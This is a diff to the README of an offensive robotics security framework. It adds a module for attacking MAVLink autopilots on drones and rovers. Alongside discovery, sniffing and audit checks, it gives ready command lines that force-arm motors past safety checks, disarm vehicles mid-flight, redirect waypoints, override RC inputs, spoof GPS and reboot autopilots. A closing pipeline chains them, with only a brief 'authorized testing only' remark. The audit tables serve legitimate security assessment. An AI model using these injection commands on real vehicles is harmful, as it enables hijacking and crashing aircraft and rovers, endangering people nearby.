@@ -9,10 +9,10 @@
   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
 ```
 
-**DDS/RTPS + ROS 1 + ICS/OT Bridge + Post-Exploitation C2 + micro-ROS/XRCE + Unitree Physical Robot Targeting Offensive Security Assessment Framework**
+**DDS/RTPS + ROS 1 + ICS/OT Bridge + Post-Exploitation C2 + micro-ROS/XRCE + Unitree Physical Robot Targeting + MAVLink/Autopilot Security Offensive Security Assessment Framework**
 
 > Author: Gh057x | v0.6.0-alpha
-> Targets: ROS 2 (Humble / Jazzy) · DDS (Fast DDS, Cyclone DDS, RTI Connext) · ROS 1 (Noetic / Melodic) · ICS/OT (Modbus, DNP3, OPC UA, MQTT, EtherCAT, AWS IoT) · micro-ROS (XRCE / DDS-XRCE, Arduino, STM32, ESP32, nRF52) · Unitree Robotics (Go2, G1, B2, B2W, H1, H2, A1, Go1)
+> Targets: ROS 2 (Humble / Jazzy) · DDS (Fast DDS, Cyclone DDS, RTI Connext) · ROS 1 (Noetic / Melodic) · ICS/OT (Modbus, DNP3, OPC UA, MQTT, EtherCAT, AWS IoT) · micro-ROS (XRCE / DDS-XRCE, Arduino, STM32, ESP32, nRF52) · Unitree Robotics (Go2, G1, B2, B2W, H1, H2, A1, Go1) · MAVLink/Autopilot (ArduPilot, PX4 — rovers, copters, planes via mavros)
 
 ---
 
@@ -46,6 +46,7 @@ The framework covers the full attack lifecycle — from initial recon to persist
 | **Phase 5C — Nav2 + ros2_control** | Navigation stack lifecycle attacks, costmap/sensor data poisoning, behavior tree hijacking, and ros2_control hardware interface exploitation |
 | **Phase 6 — Edge AI / Perception** | AI inference service enumeration, adversarial perturbation generation + DDS injection, black-box model extraction, and ML model backdooring/swap |
 | **Phase 7 — Physical Robot Targeting (Unitree)** | DDS-based recon, unauthenticated Sport API exploitation, direct LowCmd motor injection with CRC32-correct packets, and continuous sport mode hijacking across Unitree Go2/G1/B2/H1/H2/A1/Go1 |
+| **Phase 8 — MAVLink / Autopilot Security** | MAVLink endpoint discovery and fingerprinting, deep parameter/firmware/mission enumeration via pymavlink, passive traffic interception with GPS extraction, command injection (mode switch, arm/disarm, waypoint, RC override, GPS spoof, e-stop), automated security audit with risk scoring, and mavros ROS 2 ↔ MAVLink bridge attack surface analysis |
 
 ---
 
@@ -110,7 +111,13 @@ ros2reaper_framework/
         ├── unitree_recon.py           # DDS topic fingerprinting, model ID, vulnerability assessment
         ├── unitree_api_exploit.py     # Unauthenticated Sport API injection (39 command IDs)
         ├── unitree_lowcmd_injector.py # Direct LowCmd motor control with CRC32-correct 812-byte packets
-        └── unitree_sport_hijacker.py  # Continuous high-frequency sport mode hijacking
+        ├── unitree_sport_hijacker.py  # Continuous high-frequency sport mode hijacking
+        ├── mavlink_discovery.py       # MAVLink endpoint scanning via raw UDP/TCP probes (no pymavlink)
+        ├── mavlink_enum.py            # Deep enumeration: params, firmware, missions, home position
+        ├── mavlink_interceptor.py     # Passive MAVLink traffic capture and GPS extraction
+        ├── mavlink_injection.py       # Command injection: mode switch, arm, waypoint, RC, GPS spoof
+        ├── mavlink_audit.py           # Security posture assessment with risk scoring
+        └── mavros_bridge.py           # mavros ROS 2 ↔ MAVLink bridge analysis
 ```
 
 ---
@@ -131,6 +138,11 @@ pip install -r requirements.txt
 > ```
 >
 > Phase 4 has no additional dependencies — pure Python 3.8+ stdlib only.
+>
+> Phase 8 (MAVLink) requires pymavlink for enumeration, injection, and audit (discovery works without it):
+> ```bash
+> pip install pymavlink
+> ```
 >
 > GUI requires [CustomTkinter](https://github.com/TomSchimansky/CustomTkinter):
 > ```bash
@@ -181,6 +193,7 @@ The GUI exposes all framework modules across every phase:
 | Phase 5C — Nav2/Ctrl | `nav2-lifecycle`, `nav2-costmap`, `nav2-bt`, `ros2ctrl-exploit` |
 | Phase 6 — Edge AI | `ai-enum`, `ai-perturb`, `ai-extract`, `ai-poison` |
 | Phase 7 — Unitree | `unitree-recon`, `unitree-api`, `unitree-lowcmd`, `unitree-sport` |
+| Phase 8 — MAVLink | `mavlink-discover`, `mavlink-enum`, `mavlink-sniff`, `mavlink-inject`, `mavlink-audit`, `mavros-bridge` |
 
 ---
 
@@ -1893,6 +1906,257 @@ python3 ros2reaper.py unitree-sport --unitree-sport-mode spoof_state \
 ```
 
 ---
+
+## Phase 8 — MAVLink / Autopilot Security
+
+> Discovery module works with no dependencies (raw socket probes). Enumeration, injection, and audit require `pymavlink>=2.4.40`. The mavros bridge analyzer works best with `rclpy` but falls back to DDS-level discovery.
+
+Phase 8 extends ROS2Reaper to MAVLink-based autopilot systems — drones, rovers, and other unmanned vehicles running ArduPilot or PX4 firmware. MAVLink is a lightweight binary protocol (v1/v2) that typically runs unauthenticated over UDP (ports 14550, 14540) or TCP (5760, 5762). The `mavros` ROS 2 node bridges DDS topics to MAVLink commands, creating a cross-layer attack path: DDS → mavros → MAVLink → autopilot → physical vehicle.
+
+**Phase 8 CLI options:**
+
+| Option | Default | Description |
+|--------|---------|-------------|
+| `--mavlink-port` | `14550` | MAVLink UDP/TCP port |
+| `--mavlink-ports` | `14550 14540 5760 5762 14580` | Ports to scan for `mavlink-discover` |
+| `--mavlink-listen-port` | `14550` | Port for passive MAVLink listen |
+| `--mavlink-protocol` | `udp` | Transport protocol: `udp` or `tcp` |
+| `--mavlink-inject-mode` | — | Injection mode (see `mavlink-inject`) |
+| `--mavlink-flight-mode` | `guided` | Target flight/drive mode for `mode_switch` |
+| `--mavlink-vehicle-type` | `rover` | Vehicle type: `rover`, `copter`, `px4` |
+| `--mavlink-alt` | `10.0` | Altitude in meters for waypoint/GPS spoof |
+| `--mavlink-speed` | `5.0` | Speed in m/s for speed injection |
+| `--mavlink-rc-channels` | — | RC override as `ch:pwm` pairs (e.g., `3:1700 1:1500`) |
+| `--mavros-namespace` | `/mavros` | mavros ROS 2 namespace |
+| `--force` | — | Force arm/disarm (bypass safety — magic number 21196) |
+
+---
+
+### `mavlink-discover` — MAVLink Endpoint Discovery & Fingerprinting
+
+Scans for MAVLink endpoints by sending v1 and v2 heartbeat probes over UDP and TCP. Builds raw packets with manual X.25 CRC — no pymavlink dependency for discovery. Also supports passive listen mode.
+
+```bash
+# Single target
+python3 ros2reaper.py mavlink-discover --target 192.168.1.100 --skip-auth
+
+# Network sweep
+python3 ros2reaper.py mavlink-discover --network 192.168.1.0/24 --skip-auth
+
+# Passive listen (stealth — no packets sent)
+python3 ros2reaper.py mavlink-discover --passive --mavlink-listen-port 14550 --duration 60 --skip-auth
+
+# Custom port list
+python3 ros2reaper.py mavlink-discover --target 192.168.1.100 --mavlink-ports 14550 14540 5760 --skip-auth
+```
+
+Output includes:
+- Endpoint IP, port, protocol, and MAVLink version (v1/v2)
+- System ID and component ID
+- Autopilot type (ArduPilot, PX4, Generic, etc.)
+- Vehicle type (rover, copter, plane, submarine, etc.)
+- Flight mode and arming state
+- MAVLink v2 signing status
+
+---
+
+### `mavlink-enum` — Deep Autopilot Enumeration
+
+Connects via pymavlink and extracts detailed system information: all parameters, firmware version (AUTOPILOT_VERSION), mission waypoints, and home position. Performs security parameter analysis to identify misconfigurations.
+
+```bash
+# Enumerate via UDP
+python3 ros2reaper.py mavlink-enum --target 192.168.1.100 --mavlink-port 14550 -o enum.json --skip-auth
+
+# Enumerate via TCP
+python3 ros2reaper.py mavlink-enum --target 192.168.1.100 --mavlink-port 5760 --mavlink-protocol tcp --skip-auth
+```
+
+**Security parameters analyzed:**
+
+| Parameter | Risk if Misconfigured |
+|-----------|----------------------|
+| `ARMING_CHECK` | Disabled = arm without GPS fix, safety switch, or pre-arm checks |
+| `FS_THR_ENABLE` | Disabled = no throttle failsafe on RC loss |
+| `FS_GCS_ENABLE` | Disabled = no GCS failsafe on telemetry loss |
+| `FENCE_ENABLE` | Disabled = no geofence boundary enforcement |
+| `SYSID_THISMAV` / `SYSID_MYGCS` | Default values = no system isolation |
+| `RC_OVERRIDE_TIME` | Non-zero = RC override from GCS is accepted |
+
+---
+
+### `mavlink-sniff` — Passive Traffic Interception
+
+Captures MAVLink traffic without sending any packets (stealth mode). Decodes message types, extracts GPS coordinates from `GLOBAL_POSITION_INT`, and builds traffic statistics by system/component.
+
+```bash
+# 60-second capture
+python3 ros2reaper.py mavlink-sniff --mavlink-listen-port 14550 --duration 60 -o sniff.json --skip-auth
+
+# Verbose — show each decoded message
+python3 ros2reaper.py mavlink-sniff --mavlink-listen-port 14550 --duration 30 -v --skip-auth
+```
+
+Output includes:
+- Per-system/component message statistics
+- Message type breakdown by category (telemetry, GPS, mission, command, RC, sensor, system)
+- GPS track with lat/lon/alt/heading extraction
+- Total packet count and capture duration
+
+---
+
+### `mavlink-inject` — MAVLink Command Injection
+
+Active exploitation via pymavlink. Injects MAVLink commands to take control of the autopilot: switch flight modes, arm/disarm motors, redirect waypoints, override RC channels, inject speed commands, trigger emergency stop, spoof GPS position, or force reboot.
+
+| Mode | Effect | Risk |
+|------|--------|------|
+| `mode_switch` | Change flight/drive mode (e.g., to GUIDED for autonomous control) | HIGH |
+| `arm` | Arm motors (with optional force bypass via magic number 21196) | CRITICAL |
+| `disarm` | Disarm motors mid-flight/drive | CRITICAL |
+| `waypoint` | Redirect vehicle to attacker-chosen GPS coordinates | CRITICAL |
+| `rc_override` | Override RC inputs at 20 Hz (throttle, steering, etc.) | HIGH |
+| `speed` | Inject DO_CHANGE_SPEED command | MEDIUM |
+| `estop` | Emergency stop — kill motors immediately | CRITICAL |
+| `gps_spoof` | Inject fake GPS_INPUT at 10 Hz with fabricated fix data | CRITICAL |
+| `reboot` | Force autopilot reboot via PREFLIGHT_REBOOT_SHUTDOWN | HIGH |
+
+```bash
+# Switch rover to GUIDED mode
+python3 ros2reaper.py mavlink-inject --target 192.168.1.100 \
+  --mavlink-inject-mode mode_switch --mavlink-flight-mode guided --skip-auth
+
+# Force arm (bypass all safety checks)
+python3 ros2reaper.py mavlink-inject --target 192.168.1.100 \
+  --mavlink-inject-mode arm --force --skip-auth
+
+# Redirect to GPS coordinates
+python3 ros2reaper.py mavlink-inject --target 192.168.1.100 \
+  --mavlink-inject-mode waypoint --x 47.397 --y 8.5455 --mavlink-alt 10 --skip-auth
+
+# RC override — throttle channel 3 to 1700 PWM for 5 seconds
+python3 ros2reaper.py mavlink-inject --target 192.168.1.100 \
+  --mavlink-inject-mode rc_override --mavlink-rc-channels 3:1700 1:1500 --duration 5 --skip-auth
+
+# GPS spoof — fake position for 30 seconds
+python3 ros2reaper.py mavlink-inject --target 192.168.1.100 \
+  --mavlink-inject-mode gps_spoof --x 40.7128 --y -74.0060 --duration 30 --skip-auth
+
+# Emergency stop
+python3 ros2reaper.py mavlink-inject --target 192.168.1.100 \
+  --mavlink-inject-mode estop --skip-auth
+
+# Force reboot
+python3 ros2reaper.py mavlink-inject --target 192.168.1.100 \
+  --mavlink-inject-mode reboot --skip-auth
+```
+
+---
+
+### `mavlink-audit` — MAVLink Security Posture Assessment
+
+Automated security audit combining discovery, enumeration, and analysis. Probes the endpoint, pulls all parameters, and evaluates 10+ security checks with risk scoring.
+
+**Checks performed:**
+
+| Check | Severity | Description |
+|-------|----------|-------------|
+| MAVLink v2 signing | CRITICAL | v2 message signing not enabled — any sender accepted |
+| Default system IDs | MEDIUM | SYSID_THISMAV=1, SYSID_MYGCS=255 — no system isolation |
+| Arming checks disabled | HIGH | ARMING_CHECK=0 — arm without pre-flight safety |
+| Failsafes disabled | HIGH | Throttle/GCS/battery failsafe not configured |
+| Geofence disabled | MEDIUM | No geofence boundary — vehicle can fly/drive anywhere |
+| RC override accepted | MEDIUM | RC_OVERRIDE_TIME > 0 — GCS can override RC inputs |
+| Logging disabled | LOW | No onboard logging — no forensic trail |
+| GPS not required | MEDIUM | GPS fix not required for arming |
+| Serial protocol exposure | MEDIUM | MAVLink on multiple serial ports |
+| Port exposure | HIGH | MAVLink on multiple network-accessible UDP/TCP ports |
+
+Risk scoring: CRITICAL=10, HIGH=5, MEDIUM=2, LOW=1. Thresholds: ≥30 CRITICAL, ≥15 HIGH, ≥5 MEDIUM.
+
+```bash
+# Full audit
+python3 ros2reaper.py mavlink-audit --target 192.168.1.100 -o audit.json --skip-auth
+
+# Audit via TCP
+python3 ros2reaper.py mavlink-audit --target 192.168.1.100 --mavlink-port 5760 \
+  --mavlink-protocol tcp -o audit.json --skip-auth
+```
+
+---
+
+### `mavros-bridge` — ROS 2 ↔ MAVLink Bridge Analysis
+
+Analyzes the `mavros` ROS 2 node that bridges DDS topics to MAVLink commands. Maps critical topics and services, identifies which are active, and builds cross-layer attack paths showing how DDS topic injection translates to physical vehicle commands.
+
+**Critical topics analyzed:**
+
+| Topic | Direction | Impact |
+|-------|-----------|--------|
+| `/mavros/setpoint_velocity/cmd_vel_unstamped` | DDS → MAVLink | Direct velocity control of vehicle |
+| `/mavros/rc/override` | DDS → MAVLink | RC channel injection |
+| `/mavros/setpoint_position/local` | DDS → MAVLink | Position control override |
+| `/mavros/global_position/global` | MAVLink → DDS | GPS position (spoof source) |
+| `/mavros/state` | MAVLink → DDS | Armed/mode state (reconnaissance) |
+| `/mavros/battery` | MAVLink → DDS | Battery data (safety intel) |
+
+**Attack paths mapped:**
+
+| Path | Chain | Impact |
+|------|-------|--------|
+| Velocity hijack | DDS cmd_vel → mavros → SET_POSITION_TARGET_LOCAL_NED | Direct motion control |
+| Remote arm/disarm | DDS /arming srv → mavros → MAV_CMD_COMPONENT_ARM_DISARM | Arm/disarm motors |
+| Mode switch | DDS /set_mode srv → mavros → MAV_CMD_DO_SET_MODE | Change flight mode |
+| RC override | DDS /rc/override → mavros → RC_CHANNELS_OVERRIDE | Override pilot inputs |
+| Mission replace | DDS /mission/push srv → mavros → MISSION_ITEM_INT | Replace flight plan |
+| Parameter tamper | DDS /param/set srv → mavros → PARAM_SET | Modify autopilot params |
+
+```bash
+# Analyze mavros bridge
+python3 ros2reaper.py mavros-bridge --target 192.168.1.100 \
+  --mavros-namespace /mavros -o bridge.json --skip-auth
+
+# Custom namespace
+python3 ros2reaper.py mavros-bridge --target 192.168.1.100 \
+  --mavros-namespace /uav1/mavros --skip-auth
+```
+
+---
+
+### Phase 8 Pipeline
+
+Full MAVLink autopilot assessment workflow:
+
+```bash
+# 1. Discover MAVLink endpoints on the network
+python3 ros2reaper.py mavlink-discover --network 192.168.1.0/24 -o endpoints.json --skip-auth
+
+# 2. Passive traffic capture — map systems and extract GPS
+python3 ros2reaper.py mavlink-sniff --mavlink-listen-port 14550 --duration 60 -o traffic.json --skip-auth
+
+# 3. Deep enumeration — pull all parameters, firmware, missions
+python3 ros2reaper.py mavlink-enum --target 192.168.1.100 -o enum.json --skip-auth
+
+# 4. Security audit — automated risk assessment
+python3 ros2reaper.py mavlink-audit --target 192.168.1.100 -o audit.json --skip-auth
+
+# 5. Analyze mavros bridge (if ROS 2 ↔ MAVLink bridge is present)
+python3 ros2reaper.py mavros-bridge --target 192.168.1.100 -o bridge.json --skip-auth
+
+# 6. Exploitation (authorized testing only):
+# Switch to GUIDED mode
+python3 ros2reaper.py mavlink-inject --target 192.168.1.100 \
+  --mavlink-inject-mode mode_switch --mavlink-flight-mode guided --skip-auth
+
+# Force arm and redirect
+python3 ros2reaper.py mavlink-inject --target 192.168.1.100 \
+  --mavlink-inject-mode arm --force --skip-auth
+python3 ros2reaper.py mavlink-inject --target 192.168.1.100 \
+  --mavlink-inject-mode waypoint --x 47.397 --y 8.5455 --mavlink-alt 10 --skip-auth
+```
+
+---
+
 
 ## Output
 
